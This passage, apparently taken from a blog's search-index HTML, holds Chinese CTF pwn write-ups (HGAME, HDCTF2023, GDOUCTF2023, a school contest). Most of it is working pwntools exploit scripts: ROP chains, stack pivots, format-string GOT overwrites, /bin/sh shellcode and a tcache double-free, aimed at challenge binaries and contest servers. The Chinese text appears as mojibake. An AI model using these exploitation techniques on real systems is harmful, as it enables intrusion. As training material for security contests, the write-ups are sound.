#write
payload+=p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(bss_addr+0x300)+p64(pop_rdx_ret)+p64(0x50)+p64(write_addr)

payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(bss_addr+0x8)+p64(leave_ret)
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004012be : leave ; ret
# 0x000000000040138c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040138e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401390 : pop r14 ; pop r15 ; ret
# 0x0000000000401392 : pop r15 ; ret
# 0x000000000040138b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040138f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040117d : pop rbp ; ret
# 0x0000000000401393 : pop rdi ; ret
# 0x0000000000401391 : pop rsi ; pop r15 ; ret
# 0x000000000040138d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x00000000004012a8 : ret 0x2be

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
">HGAME week1 Â§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/wfsX-MIpi/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNÔºö&lt;/h3&gt;
&lt;h4 id=&#34;pwnner&#34;&gt;PwnnerÔºö&lt;/h4&gt;
&lt;p&gt;‰º™ÈöèÊú∫+ret2text&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./pwnner&amp;quot;)
io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28470)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

cs.srand(0x39)
io.recvuntil(b&amp;quot;name:\n&amp;quot;)
payload=cs.rand()
io.send(str(payload))
io.recvuntil(b&amp;quot;next?\n&amp;quot;)
payload=cyclic(0x48)+p64(0x4008b2)
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;keep-on&#34;&gt;KEEP ON:&lt;/h4&gt;
&lt;p&gt;fmtarg+Ê†àËøÅÁßª&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./hdctf&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28624)
elf=ELF(&amp;quot;./hdctf&amp;quot;)

read_text=0x4007D7
leave_ret=0x4007f2
pop_rdi_ret=0x4008d3
bss_addr=0x601800
main=0x400746
ret=0x4005b9

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;name: \n&amp;quot;)
io.send(b&amp;quot;%1$paaa./bin/sh\x00&amp;quot;)

io.recvuntil(b&amp;quot;,&amp;quot;)
sh=int(io.recv(14),16)+0x12
print(&amp;quot;sh: &amp;quot;+hex(sh))

io.recvuntil(b&amp;quot;keep on !\n&amp;quot;)
payload=cyclic(0x50)+p64(0x601900)+p64(read_text)
io.send(payload)
payload=p64(0)+p64(ret)+p64(pop_rdi_ret)+p64(sh)+p64(elf.sym[b&amp;quot;system&amp;quot;])
payload=payload.ljust(0x50,b&amp;quot;a&amp;quot;)+p64(0x601900-0x50)+p64(leave_ret)
io.send(payload)

io.interactive()


# Gadgets information
# ============================================================
# 0x00000000004007f2 : leave ; ret
# 0x00000000004008cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008ce : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008d0 : pop r14 ; pop r15 ; ret
# 0x00000000004008d2 : pop r15 ; ret
# 0x00000000004008cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008cf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006b0 : pop rbp ; ret
# 0x00000000004008d3 : pop rdi ; ret
# 0x00000000004008d1 : pop rsi ; pop r15 ; ret
# 0x00000000004008cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005b9 : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;makewish&#34;&gt;MakewishÔºö&lt;/h4&gt;
&lt;p&gt;Â≠òÂú®Ê†à‰∏äoff by nullÔºå‰ºöÂ∞ÜrbpÊú´Â∞æÊõ¥Êîπ‰∏∫&lt;code&gt;\x00&lt;/code&gt;ÔºåÂèØ‰ª•Ê†πÊçÆËøô‰∏ÄÁÇπÁàÜÁ†¥retnÂú∞ÂùÄÔºå‰ΩøÁî®retÊä¨È´òÊ†à&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1682263550135.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./makewish&amp;quot;)
# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28763)
elf=ELF(&amp;quot;./makewish&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

shell=0x4007c7
ret=0x4005d9

io.recvuntil(b&amp;quot;name\n\n&amp;quot;)
io.sendline(b&amp;quot;a&amp;quot;*(0x28-1)+b&amp;quot;b&amp;quot;)
io.recvuntil(b&amp;quot;b\n&amp;quot;)

canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary:  &amp;quot;+hex(canary))

io.recvuntil(b&amp;quot;key\n\n&amp;quot;)
io.send(p32(cs.rand()%1000+324))

gdb.attach(io)
pause()

io.recvuntil(b&amp;quot;me\n&amp;quot;)
payload=p64(ret)*10+p64(shell)
payload=payload.ljust(0x58,b&amp;quot;a&amp;quot;)+p64(canary)
io.send(payload)
io.recvuntil(b&amp;quot;that\n&amp;quot;)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040098c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400990 : pop r14 ; pop r15 ; ret
# 0x0000000000400992 : pop r15 ; ret
# 0x000000000040098b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006d0 : pop rbp ; ret
# 0x0000000000400993 : pop rdi ; ret
# 0x0000000000400991 : pop rsi ; pop r15 ; ret
# 0x000000000040098d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005d9 : ret
# 0x000000000040087a : ret 0xd089
# 0x000000000040083a : ret 0xfffd

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;minions&#34;&gt;MinionsÔºö&lt;/h4&gt;
&lt;p&gt;Ê≠§È¢òÊ†àËøÅÁßªÂà∞bssÊÆµ‰∏ä‰∏çË°åÔºåËøÅÁßªÂêéËøêË°åÈ°∫Â∫èÊ∑∑‰π±ÔºåÂèØËøÅÁßªÂà∞Ê†à‰∏äÔºåÊ≠§È¢òÈÄâÊã©Âä´ÊåÅgotË°®ÔºåÂà©Áî®fmtstr_payloadÂÆûÁé∞‰ªªÊÑèÂú∞ÂùÄÂÜô&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1682263742567.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./minions1&amp;quot;)
# io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28654)
elf=ELF(&amp;quot;./minions1&amp;quot;)

key=0x6010A0
printf_got=0x601030
hdctf_addr=0x6010C0
bss_addr=0x601300 
read_text=0x4007E8
leave_ret=0x400758
pop_rdi_ret=0x400893
ret=0x400581
main=0x400610

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;name?\n\n&amp;quot;)
payload=fmtstr_payload(6,{key:b&amp;quot;f&amp;quot;,hdctf_addr:b&amp;quot;/bin/sh\x00&amp;quot;})
io.send(payload)

io.recvuntil(b&amp;quot;you\n&amp;quot;)
payload=cyclic(0x38)+p64(main)
io.sendline(payload)

io.recvuntil(b&amp;quot;name?\n\n&amp;quot;)
payload=fmtstr_payload(6,{printf_got:elf.plt[b&amp;quot;system&amp;quot;]})
io.send(payload)

io.recvuntil(b&amp;quot;you\n&amp;quot;)
payload=cyclic(0x38)+p64(main)
io.sendline(payload)

io.recvuntil(b&amp;quot;name?\n\n&amp;quot;)
payload=b&amp;quot;/bin/sh\x00&amp;quot;
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400758 : leave ; ret
# 0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400890 : pop r14 ; pop r15 ; ret
# 0x0000000000400892 : pop r15 ; ret
# 0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400670 : pop rbp ; ret
# 0x0000000000400893 : pop rdi ; ret
# 0x0000000000400891 : pop rsi ; pop r15 ; ret
# 0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400581 : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">HDCTF2023 Â§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/0vJHH8rer/"" data-c="
          &lt;h3 id=&#34;easy-pwn&#34;&gt;EASY PWNÔºö&lt;/h3&gt;
&lt;p&gt;‰º™ÈöèÊú∫&lt;br&gt;
&lt;code&gt;open(&amp;quot;/dev/urandom&amp;quot;, 0)&lt;/code&gt;‰∫ßÁîüÁöÑÈöèÊú∫Êï∞ÔºåÊØîËæÉÂèØ‰ª•Áî®&lt;code&gt;\x00&lt;/code&gt;ÁªïËøáÔºåÁàÜÁ†¥Âç≥ÂèØ&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


while True:
    try:
        # io=process(&amp;quot;./easypwn&amp;quot;)
        io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28637)
        io.recvuntil(b&amp;quot;Password:\n&amp;quot;)
        io.sendline(b&amp;quot;\x00&amp;quot;)
        io.recvline()
        io.recvline()
        io.interactive()
    except:
        io.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;shellcode&#34;&gt;ShellcodeÔºö&lt;/h3&gt;
&lt;p&gt;shellcodeÊ®°ÊùøÈ¢ò&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./pwn1&amp;quot;)
io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28533)
leave_ret=0x40074e
ex_addr=0x6010A0
shellcode=b&amp;quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;quot;
# shellcode=asm(shellcraft.sh())
io.recvuntil(b&amp;quot;Please.\n&amp;quot;)

# gdb.attach(io)
# pause()

io.send(shellcode)
io.recvuntil(b&amp;quot;Let&#39;s start!\n&amp;quot;)
payload=cyclic(0x12)+p64(ex_addr)
io.send(payload)
io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040074e : leave ; ret
# 0x000000000040028e : ret

# Unique gadgets found: 2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;ÁúüÁî∑‰∫∫‰∏ã120Â±Ç&#34;&gt;ÁúüÁî∑‰∫∫‰∏ã120Â±ÇÔºö&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1681657864643.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÊúÄÂêé‰∏ÄÊ¨°seedÈÄöËøágdbÂä®ÊÄÅË∞ÉËØïÂèëÁé∞Âú®Á®≥ÂÆöÂú®&lt;code&gt;0xA5462D92&lt;/code&gt;Â∑¶Âè≥&lt;br&gt;
‰ΩøÁî®cdllÊ®°ÊãüÈöèÊú∫Êï∞‰∫ßÁîüÂç≥ÂèØ&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28438)
# io=process(&amp;quot;./bin&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)						
cs.srand(0xA5462D92)																					

# gdb.attach(io)
# pause()

for i in range(120):
    io.recvuntil(b&amp;quot;\n&amp;quot;)
    payload=cs.rand()%4+1
    io.sendline(str(payload))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;random&#34;&gt;RANDOMÔºö&lt;/h3&gt;
&lt;p&gt;cdllÊ®°ÊãüÈöèÊú∫Êï∞ÔºåÁÑ∂ÂêéÊûÑÈÄ†readËØªshellcodeÔºåÊ†àÂèØÂÜôÔºåÂπ∂‰∏îÊúâhahaÂáΩÊï∞ÂèØ‰ª•jmp_rspÔºåËøÅÁßªÂà∞Ê†à‰∏äÂÜôshellcode&lt;br&gt;
Ê≠§È¢òÊú¨Âú∞Ë∞ÉËØïÂç°‰ΩèÔºåËøúÁ´ØÈÄö„ÄÇ„ÄÇ„ÄÇ„ÄÇ„ÄÇ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28725)
io=process(&amp;quot;./R&amp;quot;)
elf=ELF(&amp;quot;./R&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

jmp_rsp=0x40094e
sd=cs.time(0)
cs.srand(sd)

io.recvuntil(b&amp;quot;num:\n&amp;quot;)
io.sendline(str(cs.rand()%50))
io.recvuntil(b&amp;quot;door\n&amp;quot;)

shellcode=asm(&#39;&#39;&#39;
    xor rax,rax  
    shl rdx,12   #ËÆ°Êï∞Âô®Ôºå1&amp;lt;&amp;lt;12-&amp;gt;0x40000  nbytes
    mov esi,0x601700  buf=0x601700 
    syscall
    jmp rsi   #ËøÅÁßªÂà∞0x601700
&#39;&#39;&#39;)

gdb.attach(io)
pause()

payload=cyclic(0x28)+p64(jmp_rsp)+shellcode
io.send(payload)
shellcode=asm(shellcraft.open(&amp;quot;./flag&amp;quot;)+shellcraft.read(3,0x601200,0x50)+shellcraft.write(1,0x601200,0x50))
io.send(shellcode)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">GDOUCTF2023 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/2dY2_XTLi/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWN:&lt;/h3&gt;
&lt;h4 id=&#34;Êµã‰∏ÄÊµã&#34;&gt;Êµã‰∏ÄÊµãÔºö&lt;/h4&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import time
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./can_can_need&amp;quot;)
# io=remote(&amp;quot;101.43.190.199&amp;quot;,20000)
elf=ELF(&amp;quot;./can_can_need&amp;quot;)

io.recvuntil(b&amp;quot;gift?gift!\n&amp;quot;)
io.sendline(b&amp;quot;cat flag&amp;quot;)

io.recvuntil(b&amp;quot;]\n&amp;quot;)
# io.send(b&amp;quot;%9$p&amp;quot;) #canary

# gdb.attach(io)
# pause()

io.sendline(b&amp;quot;%12$p&amp;quot;) #endbr4
io.recvuntil(b&amp;quot;!&amp;quot;)
# canary=int(io.recv(18),16)
endbr4=int(io.recv(14),16)
# print(&amp;quot;canary:  &amp;quot;+hex(canary))   #Ê≥ÑÈú≤canary
print(&amp;quot;endbr4:  &amp;quot;+hex(endbr4))   #Ê≥ÑÈú≤endbr4
base_addr=endbr4-0x13e0
sh_addr=base_addr+0x200E
gift=base_addr+0x4040
pop_rdi_ret=base_addr+0x1443 
sys_addr=base_addr+elf.plt[b&amp;quot;system&amp;quot;]



io.recvuntil(b&amp;quot;]\n&amp;quot;)
for i in range(9):
    io.sendline(b&amp;quot;+&amp;quot;)
# payload=b&amp;quot;a&amp;quot;*14+b&amp;quot;+&amp;quot;*8+p64(0)
# io.sendline(payload)
io.sendline(str(pop_rdi_ret))
io.sendline(str(pop_rdi_ret&amp;gt;&amp;gt;32))
io.sendline(str(gift))
io.sendline(str(gift&amp;gt;&amp;gt;32))
io.sendline(str(sys_addr))
io.sendline(str(sys_addr&amp;gt;&amp;gt;32))
# io.sock.shutdown(1)
io.shutdown(&#39;write&#39;)
# io.shutdown_raw(&#39;write&#39;)
# io.send(payload)

# io.close()




io.interactive()


# Gadgets information
# ============================================================
# 0x000000000000143c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000000143e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001440 : pop r14 ; pop r15 ; ret
# 0x0000000000001442 : pop r15 ; ret
# 0x000000000000143b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000000143f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000001213 : pop rbp ; ret
# 0x0000000000001443 : pop rdi ; ret
# 0x0000000000001441 : pop rsi ; pop r15 ; ret
# 0x000000000000143d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000000101a : ret
# 0x00000000000013c4 : ret 0x64be

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;5Â≠óËäÇÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Ê≥ÑÈú≤Ê†à‰∏äÂú∞ÂùÄÔºåÂà©Áî®scanfËØªÂÖ•&lt;code&gt;+-&lt;/code&gt;Âè∑ÁªïËøácanaryÔºåÊ≥®ÊÑèÊúÄÂêé‰∏ÄÊ¨°ËæìÂÖ•‰∏∫%d,4Â≠óËäÇÔºåËÄå‰∏Ä‰∏™64‰ΩçÊ†àÁ©∫Èó¥8Â≠óËäÇÔºåÊ≥®ÊÑèËÆ°ÁÆóÂÅèÁßª&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;for i in range(9):
    io.sendline(b&amp;quot;+&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ê≠§Â§ñÊúÄÂêéËØªÂÖ•Êåá‰ª§‰πüÈúÄË¶ÅËÄÉËôë%dÁöÑÈóÆÈ¢òÔºåÂàÜ‰∏§Ê¨°ËØªÂÖ•ÔºåÁ¨¨‰∏ÄÊ¨°ËØªÂÖ•‰ΩéÂ≠óËäÇÔºåÁ¨¨‰∫åÊ¨°ËØªÂÖ•È´òÂ≠óËäÇ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;io.sendline(str(pop_rdi_ret))
io.sendline(str(pop_rdi_ret&amp;gt;&amp;gt;32))
io.sendline(str(gift))
io.sendline(str(gift&amp;gt;&amp;gt;32))
io.sendline(str(sys_addr))
io.sendline(str(sys_addr&amp;gt;&amp;gt;32))
&lt;/code&gt;&lt;/pre&gt;
">TUT Ê†°ËµõÈÉ®ÂàÜÂ§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/gCjQE4_Iw/"" data-c="
          &lt;p&gt;libc-2.27.so,64‰Ωç‰øùÊä§ÂÖ®ÂºÄÔºåÊ†áÂáÜËèúÂçïÈ¢òÔºå‰∏çÂêåÁöÑÊòØÊ≠§È¢òÁî≥ËØ∑ÂíåÂêéÁª≠ÁºñËæëÂ†ÜÂùóÂ§ßÂ∞è‰∏çË∂ÖËøá0x40,‰∏îÊ≤°Êúâoff by oneÊàñËÄÖÂ†ÜÊ∫¢Âá∫Á≠âÊâãÊÆµÔºå‰∏çËÉΩÂÉèÂæÄÂ∏∏‰∏ÄÊ†∑Áî≥ËØ∑Â§ß‰∫ésmallbinÂ§ßÂ∞èÁöÑÂÜçÈáäÊîæËøõÂÖ•unsortedbinÊ≥ÑÈú≤ÊàñËÄÖÂà©Áî®unlinkÂêéÂêëÂêàÂπ∂ËøõÂÖ•unsortedbinÊ≥ÑÈú≤Ôºõ&lt;br&gt;
‰ΩÜÊòØÊ≠§È¢òÂ≠òÂú®ÊåáÈíàÊú™Ê∏ÖÈõ∂ÈÄ†ÊàêÁöÑuaf&lt;br&gt;
ÂèØ‰ª•Âà©Áî®Ê≠§ÁâπÁÇπÊ≥ÑÈú≤Â†ÜÂú∞ÂùÄÔºåÁÑ∂ÂêéÂáèÂéªÂÅèÁßªÂà∞heapÂºÄÂ§¥Â§ÑÔºåtcacheÂ§¥ÈÉ®heap+0x10Âà∞heap+0x50ÂâçÔºà0x40ÔºâÈÉΩÊòØcountsÔºå‰ª£Ë°®ÁöÑÊòØidxÊâÄÂØπÂ∫îÁöÑ‰∏çÂêåÁöÑÂ§ßÂ∞èÁöÑtcacheÁöÑ‰∏™Êï∞ÔºåËÄåÂêé0x200Ôºà0x40*8Ôºâ‰∏∫ÊåáÈíàÊï∞ÁªÑÔºåÂ≠òÊîætcache_entryÊåáÈíàÔºåÂ¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x561175c60000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x561175c60250
Size: 0x51
fd: 0x561175c60260

Allocated chunk | PREV_INUSE
Addr: 0x561175c602a0
Size: 0x51

Top chunk | PREV_INUSE
Addr: 0x561175c602f0
Size: 0x20d11

pwndbg&amp;gt; x/20gx 0x561175c60000
0x561175c60000: 0x0000000000000000      0x0000000000000251
0x561175c60010: 0x0000000002000000      0x0000000000000000
0x561175c60020: 0x0000000000000000      0x0000000000000000
0x561175c60030: 0x0000000000000000      0x0000000000000000
0x561175c60040: 0x0000000000000000      0x0000000000000000
0x561175c60050: 0x0000000000000000      0x0000000000000000
0x561175c60060: 0x0000000000000000      0x0000561175c60260
0x561175c60070: 0x0000000000000000      0x0000000000000000
0x561175c60080: 0x0000000000000000      0x0000000000000000
0x561175c60090: 0x0000000000000000      0x0000000000000000
pwndbg&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âú®Â∞ÜchunkÊîæÂÖ•tcahceÁöÑÊó∂ÂÄô‰ºöÊ£ÄÊü•&lt;code&gt;tcache-&amp;gt;counts[tc_idx] &amp;lt; mp_.tcache_count&lt;/code&gt;ÔºåËÄåÊàë‰ª¨Áü•ÈÅìÁõ∏ÂêåÂ§ßÂ∞ètcacheÊúÄÂ§öÂ≠òÂú®7‰∏™ÔºåÂç≥Êàë‰ª¨Âè™ÈúÄË¶ÅÂ∞ÜcountÊîπ‰∏∫‰∏çÂ∞è‰∫é7ÁöÑÊüê‰∏™Êï∞Âç≥ÂèØÊª°Ë∂≥ËØ•Ê£ÄÊü•ÔºåÂêéÁª≠freeÁöÑÂ†ÜÂùó‰∏ç‰ºöÊîæÂÖ•tcacheÔºåËÄåcountsÂú®heap‰∏äÔºåÊàë‰ª¨Âè™ÈúÄË¶Å‰øÆÊîπheapÁöÑcounts‰∏∫‰∏çÂ∞è‰∫é7ÁöÑÊï∞Âç≥ÂèØÔºåËøôÈÅìÈ¢òÊàë‰ª¨ÂèØ‰ª•Âà©Áî®double freeÊù•‰øÆÊîπheap‰∏äÁöÑÂÜÖÂÆπÔºå‰øÆÊîπÂêéÈáäÊîæheapÔºå‰ΩøÂÖ∂ËøõÂÖ•unsortedbinËé∑Âèñmain_arenaÂÅèÁßªÂú∞ÂùÄËøõËÄåÊ≥ÑÈú≤libcÔºõ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;delete(0)
delete(0)
show(0)
leak_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
heap_addr=leak_addr-0x260

add(0x40,p64(heap_addr+0x10)) #2
add(0x40,b&amp;quot;ddd&amp;quot;) #3
add(0x40,b&amp;quot;\x07&amp;quot;*0x40) #4
delete(4)
show(4)
libc_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰πãÂêéÂ∞ÜheapÈáçÊñ∞ÂàÜÈÖçÔºà‰ΩøÁî®edit after freeÔºåÂêéÁª≠Êõ¥ÊîπÂú®chunk 0‰∏äÊìç‰ΩúÔºåÂÜçÊ¨°ÊûÑÈÄ†double freeÔºå‰πãÂêéÂä´ÊåÅmalloc_hookÊâìone_gadgetÊàñËÄÖÂä´ÊåÅfree_hookÊûÑÈÄ†Âç≥ÂèØgetshellÔºå‰∏çÁü•ÈÅìÊòØÁâàÊú¨ÁöÑÂéüÂõ†ÔºåÊú¨È¢òË∞ÉÊ†àÊîπreallocÂÅèÁßªÊâìone_gadget‰∏çË°åÔºåÊïÖÊúÄÂêéÈááÁî®Âä´ÊåÅfree_hookÊûÑÈÄ†&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./drunk&amp;quot;)
elf=ELF(&amp;quot;./drunk&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,c):
    io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;cup:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;add?\n&amp;quot;,c)

def delete(n):
    io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;number: \n&amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;left: \n&amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;--&amp;gt;&amp;gt;&amp;gt;&amp;gt; \n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;cup:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;refill\n&amp;quot;,cc)

add(0x40,b&amp;quot;aaa&amp;quot;) #0
add(0x40,b&amp;quot;/bin/sh\x00&amp;quot;) #1

delete(0)
delete(0)
show(0)
leak_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
heap_addr=leak_addr-0x260

add(0x40,p64(heap_addr+0x10)) #2
